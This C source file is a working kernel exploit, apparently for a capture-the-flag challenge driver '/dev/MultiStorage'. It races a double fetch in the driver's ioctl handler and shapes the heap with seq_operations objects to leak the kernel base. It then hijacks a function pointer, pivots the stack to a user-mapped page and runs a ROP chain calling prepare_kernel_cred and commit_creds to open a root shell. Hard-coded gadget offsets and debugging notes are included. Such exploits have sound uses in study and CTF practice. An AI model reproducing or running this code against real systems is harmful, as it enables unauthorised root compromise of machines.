// gcc -masm=intel -pthread -static ./exp.c -o exp
#include <sys/xattr.h>
#include <sys/ipc.h>
#include <sys/shm.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <linux/userfaultfd.h>
#include <sys/types.h>
#include <stdio.h>
#include <pthread.h>
#include <errno.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <signal.h>
#include <poll.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <poll.h>
#include <stdint.h>

#define ADD 0x1337
#define DELETE 0x1338
#define VIEW 0x1339
#define TYPE1 0xbabe1337
#define TYPE2 0xbeef1337
int fd;
unsigned int *global_buffer; 

size_t mov_esp = 0x80d3e7;                  // 0xffffffff8180d3e7: mov esp, 0xd5e9ffff; ret;
size_t prepare_kernel_cred = 0x8c580;       
size_t commit_creds = 0x8c140;
size_t pop_rdi = 0x1ee08;                   // 0xffffffff81001768: pop rdi; ret; 
size_t pop_rdx = 0x4aa98;                   // 0xffffffff8104aa98: pop rdx; ret;
size_t mov_rdi_rax = 0x3d0c64;              // 0xffffffff813d0c64: mov rdi, rax; jne 0x5d0c51; xor eax, eax; ret;
size_t cmp_rcx_rdx = 0x4da5e3;              // 0xffffffff814da5e3: cmp rcx, rdx; jne 0x6da5b5; ret; 
size_t pop_rcx = 0x21403;                   // 0xffffffff81021403: pop rcx; ret;
size_t trampoline = 0xc00e06;               // ffffffff81c00df0 T swapgs_restore_regs_and_return_to_usermode    skip pop

void errExit(char* msg)
{
  puts(msg);
  exit(-1);
}

size_t user_cs, user_ss, user_rflags, user_sp;
void save_status()
{
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            );
    puts("[+]status has been saved.");
}

void getShell() {
    printf("%d\n",getuid());
   if (getuid() == 0) {
      printf("[+]Rooted!!\n");
      system("/bin/sh");
   } else {
      printf("[+]Root Fail!!\n");
   }
}

typedef struct{
    char * buf;
    unsigned int type; /* Used in view  */
}req;

void add_op(size_t buf){
    req request;
    request.buf = buf;
    request.type = 0;
    ioctl(fd, ADD, &request);
}

void delete_op(){
    req request;
    request.buf = 0;
    request.type = 0;
    ioctl(fd, DELETE, &request);
}

size_t view_op(unsigned int type){
    char *buf = calloc(1, 32*6);
    size_t *arr = (size_t *)buf;
    req request;
    request.buf = buf;
    request.type = type;
    ioctl(fd, VIEW, &request);
    return arr[0];      // The first 8 bytes is seq_operations->start.
}

void * change1(){
    usleep(5000);      // ms=0.001s   us=0.000001s  Wait until add() begin the 2nd fetch.
    global_buffer[1] = TYPE1;
    return NULL;
}
void * change2(){
    usleep(5000);
    global_buffer[8+1] = TYPE2;
    return NULL;
}

int main(){
    pthread_t th1, th2;
    save_status();
    fd = open("/dev/MultiStorage", O_RDONLY);
    if (fd<0) errExit("[-] open error!");
// 1 leak kernel base
// 1.1 construct 5 TYPE1 and 1 TYPE2,  sizeof(Type1) and sizeof(Type2) struct are both 32 bytes.
    // printf("%d\n%d\n", sizeof(Type1), sizeof(Type2));
    char *buffer = calloc(1, (32*6+4));
    unsigned int *arr_buf = (unsigned int*)buffer;
    global_buffer = (unsigned int*)buffer;

    arr_buf[0] = 6;
    for (int i=0; i<6; i++){
        if (i>0)
            arr_buf[i*8+1] = TYPE1;
        else
            arr_buf[i*8+1] = TYPE2;
    }
// 1.2 dui fengshui
    int seq, fd1, fd2;
    for (int i=0; i<0x50; i++)
        seq = open("/proc/self/stat", O_RDONLY);
// 1.3 change 1 Type2 to 0, and create seq_operations to leak uninitialed kernel func address (in fd2)
    pthread_create(&th1, NULL, change1, NULL);
    fd1 = open("/proc/self/stat",O_RDONLY);     // MultiStorage module kmalloc 2 32 bytes, fd2's address will be leaked.
    fd2 = open("/proc/self/stat",O_RDONLY);
    close(fd1);
    close(fd2);

    add_op(buffer);
    pthread_join(th1, NULL);

    size_t kernel_base = view_op(TYPE2) - 0x2005d0;
    printf("[+] kernel base = %p\n", kernel_base);
// 2. hijack control-flow and get root
    delete_op();
    memset(buffer, '\0', (32*6+4));
// 2.1 construct 5 TYPE1 and 1 TYPE2
    arr_buf[0] = 6;
    for (int i=0; i<6; i++){
        if (i>0) {
            arr_buf[i*8+1] = TYPE1;
            if (i==1){
                *(size_t *)(&arr_buf[i*8+1+1]) = (size_t)(kernel_base + mov_esp);           // 1st Type1 will be changed to Type2 to trigger overflow
                arr_buf[i*8+1+3] = 0xcafebabe;
            }
        }
        else
            arr_buf[i*8+1] = TYPE2;
    }
// 2.2 dui fengshui
    for (int i=0; i<0x10; i++)
        seq = open("/proc/self/stat",O_RDONLY);
// 2.3 change 1 Type2 to 2, hijack control-flow and get root
    pthread_create(&th2, NULL, change2, NULL);
    fd1 = open("/proc/self/stat",O_RDONLY);     // MultiStorage module kmalloc 2 32 bytes, fd2's address will be hijacked.
    fd2 = open("/proc/self/stat",O_RDONLY);
    close(fd1);
    add_op(buffer);
    pthread_join(th2, NULL);

    char *stack = mmap((void*)0xd5e9f000, 0x3000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
    if (stack != 0xd5e9f000) errExit("[-] mmap failed");
    size_t *arr_stack = (size_t *)0xd5e9ffff;
    int k=0;

    arr_stack[k++] = kernel_base + pop_rdi;
    arr_stack[k++] = 0;
    arr_stack[k++] = kernel_base + prepare_kernel_cred; 
    arr_stack[k++] = kernel_base + pop_rdx;
    arr_stack[k++] = 0;
    arr_stack[k++] = kernel_base + pop_rcx;
    arr_stack[k++] = 0;
    arr_stack[k++] = kernel_base + cmp_rcx_rdx;   // Make rcx==rax, then jne will not occur in mov_rdi_rax.
    arr_stack[k++] = kernel_base + mov_rdi_rax;
    arr_stack[k++] = kernel_base + commit_creds;
    arr_stack[k++] = kernel_base + trampoline;
    arr_stack[k++] = 0;
    arr_stack[k++] = 0;
    arr_stack[k++] = (ulong)&getShell;
    arr_stack[k++] = user_cs;
    arr_stack[k++] = user_rflags;
    arr_stack[k++] = user_sp;
    arr_stack[k++] = user_ss;

    read(fd2, buffer, 0x100);
    return 0;
}
/*
//  Type 1 stores string     32 bytes
typedef struct{
    char data[28];
    unsigned int id;
}Type1;
//  Type 2 stores int arr    32 bytes
typedef struct{
    unsigned int arr[7];
    unsigned int id;
}Type2;

//  User input  for type1    32 bytes
typedef struct{
    unsigned int type;
    char buf[28];
}input1;
//  User input  for type2    32 bytes
typedef struct{
    unsigned int type;
    unsigned int arr[7];
}input2;


(1) 
ADD()
.text:0000000000000218                 cmp     cs:t1Ptr, 0
.text:0000000000000220                 jnz     short loc_261
.text:0000000000000222                 cmp     cs:t2Ptr, 0
.text:000000000000022A                 jnz     short loc_261
.text:000000000000022C                 mov     rdi, offset aCopyingData ; "Copying data\n"
.text:0000000000000233                 xor     ebx, ebx
.text:0000000000000235                 xor     ebp, ebp
.text:0000000000000237                 call    Info

b *0xffffffffc0000000+0x218
b *0xffffffffc0000000+0x237


*/